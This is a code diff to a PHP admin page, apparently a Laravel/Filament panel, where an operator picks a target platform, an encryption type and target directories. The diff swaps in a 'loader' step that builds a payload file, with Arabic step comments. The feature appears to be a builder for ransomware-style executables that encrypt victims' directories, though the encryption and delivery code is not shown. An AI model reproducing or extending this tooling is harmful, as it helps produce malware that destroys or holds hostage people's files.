@@ -178,7 +178,6 @@ class EncryptionApps extends Page implements HasTable
                                 ->label('Encryption type')
                                 ->options([
                                     'aes' => 'AES-256-GCM',
-                                    'rsa' => 'RSA-3072',
                                     'hybrid' => 'AES + RSA',
                                 ])
                                 ->inline()
@@ -187,6 +186,7 @@ class EncryptionApps extends Page implements HasTable
                         ]),
                 ])
                 ->action(function (array $data, PayloadService $payloadService): void {
+                    // 1. إنشاء السجل في قاعدة البيانات
                     $payload = Payload::create([
                         'name' => $data['app_name'],
                         'target_os' => $data['platform'],
@@ -196,13 +196,12 @@ class EncryptionApps extends Page implements HasTable
                         'status' => 'compiling',
                     ]);
 
-                    $filePath = $payloadService->createPayloadProfile($payload, $data['platform'], [
-                        'encryption_type' => $data['encryption_type'],
-                        'target_directories' => $data['target_directories'],
-                    ]);
+                    // 2. بناء البايلود باستخدام الـ Loader
+                    $filePath = $payloadService->buildLoaderPayload($payload, $data['target_directories']);
 
+                    // 3. تحديث السجل بمسار الملف
                     $payload->update([
-                        'file_path' => 'payloads/'.$payload->id.'.exe',
+                        'file_path' => $filePath,
                         'status' => 'ready',
                     ]);
 
